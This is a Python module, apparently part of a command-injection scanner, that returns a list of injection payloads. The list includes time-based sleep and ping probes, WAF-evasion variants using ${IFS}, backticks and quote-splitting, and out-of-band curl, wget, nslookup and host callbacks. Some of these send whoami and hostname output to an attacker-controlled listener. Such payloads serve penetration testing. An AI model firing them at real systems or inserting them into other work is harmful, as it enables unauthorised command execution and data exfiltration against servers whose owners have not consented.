def generate_payloads(lhost, lport):
    """
    Returns a list of tuples: (payload_string, payload_type, expected_delay_secs)

    Payloads use {CANARY} as a placeholder — replaced with a unique UUID
    at fire-time in main.py so every callback can be matched exactly.

    payload_type values:
      "time_based" — detection relies on response latency
      "oob_http"   — HTTP callback to our listener
      "oob_dns"    — DNS lookup to our listener
    expected_delay_secs:
      For time_based: seconds the server should stall.
      For oob_*: 0 (we wait for the queue instead).
    """
    return [
        # ── TIME CANARIES ────────────────────────────────────────────
        # Linux standard
        ("; sleep 10 #",                        "time_based", 10),
        # Pipe variant — bypasses simple ';' filters
        ("| sleep 10 #",                        "time_based", 10),
        # Windows (~10s delay)
        ("& ping -n 11 127.0.0.1 > nul &",     "time_based", 10),

        # ── WAF EVASION — TIME BASED ─────────────────────────────────
        # Space filter bypass using ${IFS}
        (";${IFS}sleep${IFS}10${IFS}#",         "time_based", 10),
        # Backtick variant
        ("| `sleep 10` #",                      "time_based", 10),
        # String concat bypass — sl''eep evades keyword matching on 'sleep'
        (";sl''eep 10 #",                       "time_based", 10),

        # ── OOB HTTP PROBES ──────────────────────────────────────────
        # Basic connectivity — curl
        (f"; curl http://{lhost}:{lport}/{{CANARY}} #",                  "oob_http", 0),
        # wget fallback
        (f"; wget -q -O /dev/null http://{lhost}:{lport}/{{CANARY}} #",  "oob_http", 0),

        # ── WAF EVASION — OOB HTTP ───────────────────────────────────
        # Space filter bypass
        (f";${'{IFS}'}curl${'{IFS}'}http://{lhost}:{lport}/{{CANARY}}${'{IFS}'}#", "oob_http", 0),

        # ── DATA EXFILTRATION — HTTP ─────────────────────────────────
        # whoami via callback path
        (f"; curl http://{lhost}:{lport}/cmd/$(whoami) #",               "oob_http", 0),
        # hostname via callback path
        (f"; curl http://{lhost}:{lport}/cmd/$(hostname) #",             "oob_http", 0),

        # ── OOB DNS PROBES ───────────────────────────────────────────
        # nslookup — most common DNS client on Linux/Windows
        (f"; nslookup $(whoami).oob {lhost} #",                          "oob_dns",  0),
        # host command fallback
        (f"; host $(whoami).oob {lhost} #",                              "oob_dns",  0),
        # hostname via DNS
        (f"; nslookup $(hostname).oob {lhost} #",                        "oob_dns",  0),
    ]